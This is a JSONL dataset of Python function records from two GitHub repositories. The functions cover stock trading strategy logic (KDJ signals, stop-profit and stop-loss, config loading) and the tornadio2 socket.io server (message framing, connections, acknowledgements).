{"docstring": "# use bar time to check if before 14:30\n", "func_signal": "def before_14_30(utc_time):\n", "code": "t = arrow.get(utc_time).to('local')\nhour = t.datetime.hour\nreturn hour < 14 or (hour == 14 and t.datetime.minute < 30)", "path": "Framework\\framework\\framework\\time_util.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "'''\nbar\u5468\u671f\u6570\u636e\u4e8b\u4ef6\n'''\n", "func_signal": "def on_bar(self, bar):\n", "code": "if self.open_long_flag and self.close > self.upr and 0 == self.hoding:\n    self.open_long(self.exchange, self.sec_id, 0, OPEN_VOL)\n    self.hoding += OPEN_VOL\n    print('open long: last price %s, vol %s' % (self.close, OPEN_VOL))\nelif self.open_short_flag and self.close < self.dwn and 0 == self.hoding:\n    self.open_short(self.exchange, self.sec_id, 0, OPEN_VOL)\n    self.hoding += OPEN_VOL\n    print('open short: last price %s, vol %s' % (self.close, OPEN_VOL))\n\n# \u65e5\u5185\u5e73\u4ed3\nif bar.utc_time > self.end_trading:\n    if self.open_long_flag and self.hoding > 0:\n        self.close_long(self.exchange, self.sec_id, 0, self.hoding)\n        self.hoding = 0\n        self.open_long_flag = False\n        print('end trading time close long, vol: %s' % self.hoding)\n    elif self.open_short_flag and self.hoding > 0:\n        self.close_short(self.exchange, self.sec_id, 0, self.hoding)\n        self.hoding = 0\n        self.open_short_flag = False\n        print('end trading time close short, vol: %s' % self.hoding)", "path": "SkyPark\\python\\SkyPark.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "\"\"\"\n\u529f\u80fd\uff1a\u83b7\u53d6\u80a1\u7968\u6c60\u4e2d\u7684\u4ee3\u7801\n\"\"\"\n", "func_signal": "def get_stock_pool(cls, csv_file):\n", "code": "csvfile = open(csv_file, 'r')\nreader = csv.reader(csvfile)\nfor line in reader:\n    cls.cls_stock_pool.append(line[0])\n\nreturn", "path": "KDJ-STOCK\\python\\kdj_stock.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "\"\"\"\n\u529f\u80fd\uff1a\u65b0\u7684\u4e00\u5929\u521d\u59cb\u5316\u6570\u636e\n\"\"\"\n# \u65b0\u7684\u4e00\u5929\uff0c\u53bb\u6389\u7b2c\u4e00\u7b14\u6570\u636e,\u5e76\u7559\u51fa\u4e00\u4e2a\u7a7a\u4f4d\u5b58\u50a8\u5f53\u5929\u7684\u4e00\u7b14\u6570\u636e\n", "func_signal": "def init_data_newday(self):\n", "code": "for key in self.dict_price:\n    if len(self.dict_price[key][0]) >= self.hist_size and self.dict_price[key][0][-1] > INIT_HIGH_PRICE:\n        self.dict_price[key][0] = np.append(self.dict_price[key][0][1:], INIT_HIGH_PRICE)\n    elif len(self.dict_price[key][0]) < self.hist_size and self.dict_price[key][0][-1] > INIT_HIGH_PRICE:\n        # \u672a\u53d6\u8db3\u6307\u6807\u6240\u9700\u5168\u90e8\u5386\u53f2\u6570\u636e\u65f6\u56de\u6d4b\u8fc7\u7a0b\u4e2d\u8865\u5145\u6570\u636e\n        self.dict_price[key][0] = np.append(self.dict_price[key][0][:], INIT_HIGH_PRICE)\n\n    if len(self.dict_price[key][1]) >= self.hist_size and self.dict_price[key][1][-1] < INIT_LOW_PRICE:\n        self.dict_price[key][1] = np.append(self.dict_price[key][1][1:], INIT_LOW_PRICE)\n    elif len(self.dict_price[key][1]) < self.hist_size and self.dict_price[key][1][-1] < INIT_LOW_PRICE:\n        self.dict_price[key][1] = np.append(self.dict_price[key][1][:], INIT_LOW_PRICE)\n\n    if len(self.dict_price[key][2]) >= self.hist_size and abs(\n                    self.dict_price[key][2][-1] - INIT_CLOSE_PRICE) > EPS:\n        self.dict_price[key][2] = np.append(self.dict_price[key][2][1:], INIT_CLOSE_PRICE)\n    elif len(self.dict_price[key][2]) < self.hist_size and abs(\n                    self.dict_price[key][2][-1] - INIT_CLOSE_PRICE) > EPS:\n        self.dict_price[key][2] = np.append(self.dict_price[key][2][:], INIT_CLOSE_PRICE)\n\n# \u521d\u59cb\u5316\u5f00\u4ed3\u64cd\u4f5c\u4fe1\u53f7\u5b57\u5178\nfor key in self.dict_open_close_signal:\n    self.dict_open_close_signal[key] = False\n\n# \u5f00\u4ed3\u540e\u5230\u5f53\u524d\u7684\u4ea4\u6613\u65e5\u5929\u6570\nkeys = list(self.dict_open_cum_days.keys())\nfor key in keys:\n    if self.dict_open_cum_days[key] >= self.open_max_days:\n        del self.dict_open_cum_days[key]\n    else:\n        self.dict_open_cum_days[key] += 1", "path": "KDJ-STOCK\\python\\kdj_stock.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "# use bar time to check if after 10 AM\n", "func_signal": "def after_10_am(utc_time):\n", "code": "t = arrow.get(utc_time).to('local')\nhour = t.datetime.hour\nreturn hour >= 10", "path": "Framework\\framework\\framework\\time_util.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "'''\nread stocks from csv file\n:return:\n'''\n\n", "func_signal": "def __init_data__(self):\n", "code": "csv_file = self.csv_file\n\nsubscribe_symbols, symbols = self.prepare_subscribe_symbols(csv_file)\n\nsub_suffix = \"daily\" if self.bar_type == '1d' else str(self.bar_type)\n\nps = self.get_positions()\nfor p in ps:\n    sym = \".\".join([p.exchange, p.sec_id])\n    symbols.add(sym)\n\n    if self.mode in (2,3) or self.backtest_use_tick:\n        subscribe_symbols.add(sym + \".tick\")\n    subscribe_symbols.add(\"{}.bar.{}\".format(sym, sub_suffix))   ## bar according to configured bar_type\n\nfor p in ps:\n    highest_price, lowest_price = self.get_highest_lowest_price_since_open(sym, p.init_time)\n    b_p = p if p.side == OrderSide_Bid else None\n    a_p = p if p.side == OrderSide_Ask else None\n    self.care_positions_for_symbol(sym, a_p, b_p, highest_price, lowest_price, act=False)\n\nself.history_data(symbols, self.bar_type, self.window_size)\n\nsubscribe_symbols.add(\"SHSE.000001.tick\")   ## \u4e0a\u8bc1\u6307\u6570\n\nsubscribe_symbols.add(\"SHSE.000001.bar.{}\".format(sub_suffix))   ## bar according to configured bar_type\n\nself.logger.info(\"subscribe symbols: {}\".format(subscribe_symbols))\n\n# subscribe\nself.subscribe(\",\".join(subscribe_symbols))", "path": "Framework\\framework\\framework\\ta.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "\"\"\"\n\u529f\u80fd\uff1a\u83b7\u53d6\u8ba2\u9605\u4ee3\u7801\u7684\u521d\u59cb\u5316\u6570\u636e\n\"\"\"\n", "func_signal": "def init_data(self):\n", "code": "for ticker in self.cls_stock_pool:\n    # \u521d\u59cb\u5316\u5f00\u4ed3\u64cd\u4f5c\u4fe1\u53f7\u5b57\u5178\n    self.dict_open_close_signal.setdefault(ticker, False)\n\n    daily_bars = self.get_last_n_dailybars(ticker, self.hist_size - 1, self.cur_date)\n    if len(daily_bars) <= 0:\n        continue\n\n    end_daily_bars = self.get_last_n_dailybars(ticker, 1, self.end_date)\n    if len(end_daily_bars) <= 0:\n        continue\n\n    if ticker not in self.dict_last_factor:\n        continue\n\n    end_adj_factor = self.dict_last_factor[ticker]\n    high_ls = [data.high * data.adj_factor / end_adj_factor for data in daily_bars]\n    high_ls.reverse()\n    low_ls = [data.low * data.adj_factor / end_adj_factor for data in daily_bars]\n    low_ls.reverse()\n    cp_ls = [data.close * data.adj_factor / end_adj_factor for data in daily_bars]\n    cp_ls.reverse()\n\n    # \u7559\u51fa\u4e00\u4e2a\u7a7a\u4f4d\u5b58\u50a8\u5f53\u5929\u7684\u4e00\u7b14\u6570\u636e\n    high_ls.append(INIT_HIGH_PRICE)\n    high = np.asarray(high_ls, dtype=np.float)\n    low_ls.append(INIT_LOW_PRICE)\n    low = np.asarray(low_ls, dtype=np.float)\n    cp_ls.append(INIT_CLOSE_PRICE)\n    close = np.asarray(cp_ls, dtype=np.float)\n\n    # \u5b58\u50a8\u5386\u53f2\u7684high low close\n    self.dict_price.setdefault(ticker, [high, low, close])\n\n    # end = time.clock()\n    # logging.info('init_data cost time: %f s' % (end - start))", "path": "KDJ-STOCK\\python\\kdj_stock.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "\"\"\"\n\u529f\u80fd\uff1a\u79fb\u52a8\u6b62\u76c8, \u79fb\u52a8\u6b62\u76c8\u6b62\u635f\u6309\u8fdb\u573a\u540e\u7684\u6700\u9ad8\u4ef7\u4e58\u4ee5\u8bbe\u7f6e\u7684\u6bd4\u7387\u4e0e\u5f53\u524d\u4ef7\u683c\u76f8\u6bd4\uff0c\n      \u5e76\u4e14\u76c8\u5229\u6bd4\u7387\u8fbe\u5230\u8bbe\u5b9a\u7684\u76c8\u4e8f\u6bd4\u7387\u65f6\uff0c\u6267\u884c\u6b62\u76c8\n\"\"\"\n", "func_signal": "def movement_stop_profit_loss(self, bar):\n", "code": "if self.is_movement_stop == 0:\n    return\n\nentry_high = None\nentry_low = None\npos = self.get_position(bar.exchange, bar.sec_id, OrderSide_Bid)\nsymbol = bar.exchange + '.' + bar.sec_id\n\nis_stop_profit = True\n\nif pos is not None and pos.volume > 0:\n    if symbol in self.dict_entry_high_low:\n        if self.dict_entry_high_low[symbol][0] < bar.close:\n            self.dict_entry_high_low[symbol][0] = bar.close\n            is_stop_profit = False\n        if self.dict_entry_high_low[symbol][1] > bar.close:\n            self.dict_entry_high_low[symbol][1] = bar.close\n        [entry_high, entry_low] = self.dict_entry_high_low[symbol]\n\n    else:\n        self.dict_entry_high_low.setdefault(symbol, [bar.close, bar.close])\n        [entry_high, entry_low] = self.dict_entry_high_low[symbol]\n        is_stop_profit = False\n\n    if is_stop_profit:\n        # \u79fb\u52a8\u6b62\u76c8\n        if bar.close <= (\n            1 - self.stop_movement_profit) * entry_high and pos.fpnl / pos.cost >= self.stop_fixation_profit:\n            if pos.volume - pos.volume_today > 0:\n                self.close_long(bar.exchange, bar.sec_id, 0, pos.volume - pos.volume_today)\n                self.dict_open_close_signal[symbol] = True\n                logging.info(\n                    'movement stop profit: close long, symbol:%s, time:%s, price:%.2f, vwap:%.2f, volume:%s' % (\n                        symbol, bar.strtime, bar.close, pos.vwap, pos.volume))\n\n                # \u6b62\u635f\n    if pos.fpnl < 0 and pos.fpnl / pos.cost <= -1 * self.stop_fixation_loss:\n        self.close_long(bar.exchange, bar.sec_id, 0, pos.volume - pos.volume_today)\n        self.dict_open_close_signal[symbol] = True\n        logging.info(\n            'movement stop loss: close long, symbol:%s, time:%s, price:%.2f, vwap:%.2f, volume:%s' % (symbol,\n                                                                                                      bar.strtime,\n                                                                                                      bar.close,\n                                                                                                      pos.vwap,\n                                                                                                      pos.volume))", "path": "KDJ-STOCK\\python\\kdj_stock.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "\"\"\"\n\u529f\u80fd\uff1a\u8bfb\u53d6\u7b56\u7565\u914d\u7f6e\u6587\u4ef6\n\"\"\"\n", "func_signal": "def read_ini(cls, ini_name):\n", "code": "cls.cls_config = configparser.ConfigParser()\ncls.cls_config.read(ini_name)", "path": "KDJ-STOCK\\python\\kdj_stock.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "\"\"\"\n\u529f\u80fd\uff1a\u83b7\u53d6\u8ba2\u9605\u4ee3\u7801\n\"\"\"\n", "func_signal": "def get_subscribe_stock(cls):\n", "code": "cls.get_stock_pool('stock_pool.csv')\nbar_type = cls.cls_config.getint('para', 'bar_type')\nif 86400 == bar_type:\n    bar_type_str = '.bar.' + 'daily'\nelse:\n    bar_type_str = '.bar.' + '%d' % cls.cls_config.getint('para', 'bar_type')\n\ncls.cls_subscribe_symbols = ','.join(data + bar_type_str for data in cls.cls_stock_pool)\nreturn", "path": "KDJ-STOCK\\python\\kdj_stock.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "# use bar time to check if before 10 AM\n", "func_signal": "def before_10_am(utc_time):\n", "code": "t = arrow.get(utc_time).to('local')\nhour = t.datetime.hour\nreturn hour < 10 and hour >= 9     # FIXED hour error", "path": "Framework\\framework\\framework\\time_util.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "\"\"\"\n\u529f\u80fd\uff1a\u83b7\u53d6\u8fdb\u573a\u540e\u7684\u6700\u9ad8\u4ef7\u548c\u6700\u4f4e\u4ef7,\u4eff\u771f\u6216\u5b9e\u76d8\u4ea4\u6613\u542f\u52a8\u65f6\u52a0\u8f7d\n\"\"\"\n", "func_signal": "def init_entry_high_low(self):\n", "code": "pos_list = self.get_positions()\nhigh_list = []\nlow_list = []\nfor pos in pos_list:\n    symbol = pos.exchange + '.' + pos.sec_id\n    init_time = self.utc_strtime(pos.init_time)\n\n    cur_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')\n\n    daily_bars = self.get_dailybars(symbol, init_time, cur_time)\n\n    high_list = [bar.high for bar in daily_bars]\n    low_list = [bar.low for bar in daily_bars]\n\n    if len(high_list) > 0:\n        highest = np.max(high_list)\n    else:\n        highest = pos.vwap\n\n    if len(low_list) > 0:\n        lowest = np.min(low_list)\n    else:\n        lowest = pos.vwap\n\n    self.dict_entry_high_low.setdefault(symbol, [highest, lowest])", "path": "KDJ-STOCK\\python\\kdj_stock.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "\"\"\"\n\u529f\u80fd\uff1a\u8bfb\u53d6\u7b56\u7565\u914d\u7f6e\u6587\u4ef6strategy\u6bb5\u843d\u7684\u503c\n\"\"\"\n", "func_signal": "def get_strategy_conf(cls):\n", "code": "if cls.cls_config is None:\n    return\n\ncls.cls_user_name = cls.cls_config.get('strategy', 'username')\ncls.cls_password = cls.cls_config.get('strategy', 'password')\ncls.cls_strategy_id = cls.cls_config.get('strategy', 'strategy_id')\ncls.cls_subscribe_symbols = cls.cls_config.get('strategy', 'subscribe_symbols')\ncls.cls_mode = cls.cls_config.getint('strategy', 'mode')\ncls.cls_td_addr = cls.cls_config.get('strategy', 'td_addr')\nif len(cls.cls_subscribe_symbols) <= 0:\n    cls.get_subscribe_stock()\nelse:\n    subscribe_ls = cls.cls_subscribe_symbols.split(',')\n    for data in subscribe_ls:\n        index1 = data.find('.')\n        index2 = data.find('.', index1 + 1, -1)\n        cls.cls_stock_pool.append(data[:index2])\n\nreturn", "path": "KDJ-STOCK\\python\\kdj_stock.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "\"\"\"\n\u529f\u80fd\uff1autc\u8f6c\u5b57\u7b26\u4e32\u65f6\u95f4\n\"\"\"\n", "func_signal": "def utc_strtime(self, utc_time):\n", "code": "str_time = '%s' % arrow.get(utc_time).to('local')\nstr_time.replace('T', ' ')\nstr_time = str_time.replace('T', ' ')\nreturn str_time[:19]", "path": "KDJ-STOCK\\python\\kdj_stock.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "\"\"\"\n\u529f\u80fd\uff1a\u8bfb\u53d6\u7b56\u7565\u914d\u7f6e\u6587\u4ef6backtest\u6bb5\u843d\u7684\u503c\n\"\"\"\n", "func_signal": "def get_backtest_conf(cls):\n", "code": "if cls.cls_config is None:\n    return\n\ncls.cls_backtest_start = cls.cls_config.get('backtest', 'start_time')\ncls.cls_backtest_end = cls.cls_config.get('backtest', 'end_time')\ncls.cls_initial_cash = cls.cls_config.getfloat('backtest', 'initial_cash')\ncls.cls_transaction_ratio = cls.cls_config.getfloat('backtest', 'transaction_ratio')\ncls.cls_commission_ratio = cls.cls_config.getfloat('backtest', 'commission_ratio')\ncls.cls_slippage_ratio = cls.cls_config.getfloat('backtest', 'slippage_ratio')\ncls.cls_price_type = cls.cls_config.getint('backtest', 'price_type')\ncls.cls_bench_symbol = cls.cls_config.get('backtest', 'bench_symbol')\n\nreturn", "path": "KDJ-STOCK\\python\\kdj_stock.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "\"\"\"\n\u529f\u80fd\uff1a\u7b56\u7565\u542f\u52a8\u521d\u59cb\u5316\u64cd\u4f5c\n\"\"\"\n", "func_signal": "def init_strategy(self):\n", "code": "if self.cls_mode == gm.MD_MODE_PLAYBACK:\n    self.cur_date = self.cls_backtest_start\n    self.end_date = self.cls_backtest_end\nelse:\n    self.cur_date = datetime.date.today().strftime('%Y-%m-%d') + ' 08:00:00'\n    self.end_date = datetime.date.today().strftime('%Y-%m-%d') + ' 16:00:00'\n\nself.dict_open_close_signal = {}\nself.dict_entry_high_low = {}\nself.get_last_factor()\nself.init_data()\nself.init_entry_high_low()\nreturn", "path": "KDJ-STOCK\\python\\kdj_stock.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "\"\"\"\n\u529f\u80fd\uff1a\u8bfb\u53d6\u7b56\u7565\u914d\u7f6e\u6587\u4ef6para(\u81ea\u5b9a\u4e49\u53c2\u6570)\u6bb5\u843d\u7684\u503c\n\"\"\"\n", "func_signal": "def get_para_conf(self):\n", "code": "if self.cls_config is None:\n    return\n\nself.fastk_period = self.cls_config.getint('para', 'fastk_period')\nself.slowk_period = self.cls_config.getint('para', 'slowk_period')\nself.slowk_matype = self.cls_config.getint('para', 'slowk_matype')\nself.slowd_period = self.cls_config.getint('para', 'slowd_period')\nself.slowd_matype = self.cls_config.getint('para', 'slowd_matype')\nself.slowk_bid = self.cls_config.getint('para', 'slowk_bid')\nself.slowk_sell = self.cls_config.getint('para', 'slowk_sell')\nself.slowd_bid = self.cls_config.getint('para', 'slowd_bid')\nself.slowd_sell = self.cls_config.getint('para', 'slowd_sell')\nself.hist_size = self.cls_config.getint('para', 'hist_size')\nself.open_vol = self.cls_config.getint('para', 'open_vol')\nself.open_max_days = self.cls_config.getint('para', 'open_max_days')\n\nself.is_fixation_stop = self.cls_config.getint('para', 'is_fixation_stop')\nself.is_movement_stop = self.cls_config.getint('para', 'is_movement_stop')\n\nself.stop_fixation_profit = self.cls_config.getfloat('para', 'stop_fixation_profit')\nself.stop_fixation_loss = self.cls_config.getfloat('para', 'stop_fixation_loss')\n\nself.stop_movement_profit = self.cls_config.getfloat('para', 'stop_movement_profit')\n\nreturn", "path": "KDJ-STOCK\\python\\kdj_stock.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "'''\n\u83b7\u53d6\u914d\u7f6e\u53c2\u6570\n'''\n# \u4ea4\u6613\u8bc1\u5238\u4ee3\u7801\n", "func_signal": "def __get_param(self):\n", "code": "self.trade_symbol = self.config.get('para', 'trade_symbol')\npos = self.trade_symbol.find('.')\nself.exchange = self.trade_symbol[:pos]\nself.sec_id = self.trade_symbol[pos + 1:]\n\n\nFMT = '%s %s'\ntoday = arrow.now().date()\n\n# \u7b2c\u4e00\u6839K\u7ebf\u65f6\u95f4\nfirst_kline_time = self.config.get('para', 'first_kline_time')\net = FMT % (today.isoformat(), first_kline_time)\nself.first_kline_time_str = et\n\nfirst_kline_time1 = self.config.get('para', 'first_kline_time1')\net = FMT % (today.isoformat(), first_kline_time1)\nself.first_kline_time_str1 = et\n# \u5e73\u4ed3\u65f6\u95f4\nend_time = self.config.get('para', 'end_time')\net = FMT % (today.isoformat(), end_time)\nself.end_trading = arrow.get(et).replace(tzinfo='local').timestamp\nprint(\"end time %s\" % (et))\n\n# \u5f00\u591a\u9600\u503c\nself.open_long_size = self.config.getfloat('para', 'open_long_size')\n# \u5f00\u7a7a\u9600\u503c\nself.open_short_size = self.config.getfloat('para', 'open_short_size')", "path": "SkyPark\\python\\SkyPark.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "\"\"\"\n\u529f\u80fd\uff1a\u56fa\u5b9a\u6b62\u76c8\u3001\u6b62\u635f,\u76c8\u5229\u6216\u4e8f\u635f\u8d85\u8fc7\u4e86\u8bbe\u7f6e\u7684\u6bd4\u7387\u5219\u6267\u884c\u6b62\u76c8\u3001\u6b62\u635f\n\"\"\"\n", "func_signal": "def fixation_stop_profit_loss(self, bar):\n", "code": "if self.is_fixation_stop == 0:\n    return\n\nsymbol = bar.exchange + '.' + bar.sec_id\npos = self.get_position(bar.exchange, bar.sec_id, OrderSide_Bid)\nif pos is not None:\n    if pos.fpnl > 0 and pos.fpnl / pos.cost >= self.stop_fixation_profit:\n        self.close_long(bar.exchange, bar.sec_id, 0, pos.volume - pos.volume_today)\n        self.dict_open_close_signal[symbol] = True\n        logging.info(\n            'fixnation stop profit: close long, symbol:%s, time:%s, price:%.2f, vwap: %s, volume:%s' % (symbol,\n                                                                                                        bar.strtime,\n                                                                                                        bar.close,\n                                                                                                        pos.vwap,\n                                                                                                        pos.volume))\n    elif pos.fpnl < 0 and pos.fpnl / pos.cost <= -1 * self.stop_fixation_loss:\n        self.close_long(bar.exchange, bar.sec_id, 0, pos.volume - pos.volume_today)\n        self.dict_open_close_signal[symbol] = True\n        logging.info(\n            'fixnation stop loss: close long, symbol:%s, time:%s, price:%.2f, vwap:%s, volume:%s' % (symbol,\n                                                                                                     bar.strtime,\n                                                                                                     bar.close,\n                                                                                                     pos.vwap,\n                                                                                                     pos.volume))", "path": "KDJ-STOCK\\python\\kdj_stock.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "\"\"\"\n\u529f\u80fd\uff1a\u83b7\u53d6\u6307\u5b9a\u65e5\u671f\u6700\u65b0\u7684\u590d\u6743\u56e0\u5b50\n\"\"\"\n", "func_signal": "def get_last_factor(self):\n", "code": "for ticker in self.cls_stock_pool:\n    daily_bars = self.get_last_n_dailybars(ticker, 1, self.end_date)\n    if daily_bars is not None and len(daily_bars) > 0:\n        self.dict_last_factor.setdefault(ticker, daily_bars[0].adj_factor)", "path": "KDJ-STOCK\\python\\kdj_stock.py", "repo_name": "myquant/strategy", "stars": 695, "license": "apache-2.0", "language": "python", "size": 281}
{"docstring": "# find events, also in bases\n", "func_signal": "def __init__(cls, name, bases, attrs):\n", "code": "is_event = lambda x: ismethod(x) and hasattr(x, '_event_name')\nevents = [(e._event_name, e) for _, e in getmembers(cls, is_event)]\nsetattr(cls, '_events', dict(events))\n\n# Call base\nsuper(EventMagicMeta, cls).__init__(name, bases, attrs)", "path": "tornadio2\\conn.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
{"docstring": "# Tracking\n", "func_signal": "def send_messages(self, messages):\n", "code": "self.server.stats.on_packet_sent(len(messages))\n\ntry:\n    for m in messages:\n        self.write_message(m)\nexcept IOError:\n    if self.ws_connection and self.ws_connection.client_terminated:\n        logger.debug('Dropping active websocket connection due to IOError.')\n\n    self._detach()", "path": "tornadio2\\persistent.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
{"docstring": "\"\"\"Send socket.io event.\n\n`name`\n    Name of the event\n`kwargs`\n    Optional event parameters\n\"\"\"\n", "func_signal": "def emit(self, name, *args, **kwargs):\n", "code": "if self.is_closed:\n    return\n\nmsg = proto.event(self.endpoint, name, None, *args, **kwargs)\nself.session.send_message(msg)", "path": "tornadio2\\conn.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
{"docstring": "# Obviously, you want this on CDN, but for sake of\n# example this approach will work.\n", "func_signal": "def get(self):\n", "code": "self.set_header('Content-Type', 'application/x-shockwave-flash')\n\nwith open(op.join(ROOT, '../WebSocketMain.swf'), 'rb') as f:\n    self.write(f.read())\n    self.finish()", "path": "examples\\ssl_transports\\ssl_transports.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
{"docstring": "\"\"\"Generate message packet.\n\n`endpoint`\n    Optional endpoint name\n`msg`\n    Message to encode. If message is ascii/unicode string, will send message packet.\n    If object or dictionary, will json encode and send as is.\n`message_id`\n    Optional message id for ACK\n`force json`\n    Disregard msg type and send the message with JSON type. Usefull for already\n    JSON encoded strings.\n\"\"\"\n", "func_signal": "def message(endpoint, msg, message_id=None, force_json=False):\n", "code": "if msg is None:\n    # TODO: Log something ?\n    return u''\n\npacked_message_tpl = u\"%(kind)s:%(message_id)s:%(endpoint)s:%(msg)s\"\npacked_data = {'endpoint': endpoint or u'',\n               'message_id': message_id or u''}\n\n# Trying to send a dict over the wire ?\nif not isinstance(msg, (unicode, str)) and isinstance(msg, (dict, object)):\n    packed_data.update({'kind': JSON,\n                        'msg': json.dumps(msg, **json_decimal_args)})\n\n# for all other classes, including objects. Call str(obj)\n# and respect forced JSON if requested\nelse:\n    packed_data.update({'kind': MESSAGE if not force_json else JSON,\n                        'msg': msg if isinstance(msg, unicode) else str(msg).decode('utf-8')})\n\nreturn packed_message_tpl % packed_data", "path": "tornadio2\\proto.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
{"docstring": "\"\"\"Queue acknowledgment callback\"\"\"\n", "func_signal": "def queue_ack(self, callback, message):\n", "code": "ack_id = self.ack_id\n\nself.ack_queue[ack_id] = (time.time(),\n                          callback,\n                          message)\n\nself.ack_id += 1\n\nreturn ack_id", "path": "tornadio2\\conn.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
{"docstring": "# Test string message\n", "func_signal": "def test_message():\n", "code": "eq_(proto.message(None, 'abc'), u'3:::abc')\n\neq_(proto.message('abc', 'def'), u'3::abc:def')\n\neq_(proto.message(None, u'\\u0403\\u0404\\u0405'),\n                  u'3:::\\u0403\\u0404\\u0405')\n\n# TODO: Multibyte encoding fix\n\n# TODO: Fix me\neq_(proto.message(None, dict(a=1, b=2)),\n                  u'4:::%s' % proto.json_dumps(dict(a=1, b=2)))\n\n\n# TODO: Add event unit tests", "path": "tests\\proto_test.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
{"docstring": "\"\"\"Decode socket.io encoded messages. Returns list of packets.\n\n`data`\n    encoded messages\n\n\"\"\"\n# Single message - nothing to decode here\n", "func_signal": "def decode_frames(data):\n", "code": "assert isinstance(data, unicode), 'frame is not unicode'\n\nif not data.startswith(FRAME_SEPARATOR):\n    return [data]\n\n# Multiple messages\nidx = 0\npackets = []\n\nwhile data[idx:idx + 1] == FRAME_SEPARATOR:\n    idx += 1\n\n    # Grab message length\n    len_start = idx\n    idx = data.find(FRAME_SEPARATOR, idx)\n    msg_len = int(data[len_start:idx])\n    idx += 1\n\n    # Grab message\n    msg_data = data[idx:idx + msg_len]\n    idx += msg_len\n\n    packets.append(msg_data)\n\nreturn packets", "path": "tornadio2\\proto.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
{"docstring": "\"\"\"Encode list of packets.\n\n`packets`\n    List of packets to encode\n\"\"\"\n# No packets - return empty string\n", "func_signal": "def encode_frames(packets):\n", "code": "if not packets:\n    return ''\n\n# Exactly one packet - don't do any frame encoding\nif len(packets) == 1:\n    return packets[0].encode('utf-8')\n\n# Multiple packets\nframes = u''.join(u'%s%d%s%s' % (FRAME_SEPARATOR, len(p),\n                                 FRAME_SEPARATOR, p)\n                  for p in packets)\n\nreturn frames.encode('utf-8')", "path": "tornadio2\\proto.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
{"docstring": "\"\"\"Constructor.\n\n`callback`\n    Callback function\n`callback_time`\n    Callback timeout value (in milliseconds)\n`io_loop`\n    io_loop instance\n\"\"\"\n", "func_signal": "def __init__(self, callback, callback_time, io_loop):\n", "code": "self.callback = callback\nself.callback_time = callback_time\nself.io_loop = io_loop\nself._running = False\n\nself.next_run = None", "path": "tornadio2\\periodic.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
{"docstring": "\"\"\"Connection constructor.\n\n`session`\n    Associated session\n`endpoint`\n    Endpoint name\n\n\"\"\"\n", "func_signal": "def __init__(self, session, endpoint=None):\n", "code": "self.session = session\nself.endpoint = endpoint\n\nself.is_closed = False\n\nself.ack_id = 1\nself.ack_queue = dict()\n\nself._event_worker = None", "path": "tornadio2\\conn.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
{"docstring": "\"\"\"Long running task implementation.\nSimply adds 3 second timeout and then calls provided callback method.\n\"\"\"\n", "func_signal": "def long_running(self, value, callback):\n", "code": "def finish():\n    callback('Handled %s.' % value)\n\nioloop.IOLoop.instance().add_timeout(timedelta(seconds=3), finish)", "path": "examples\\gen\\gen.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
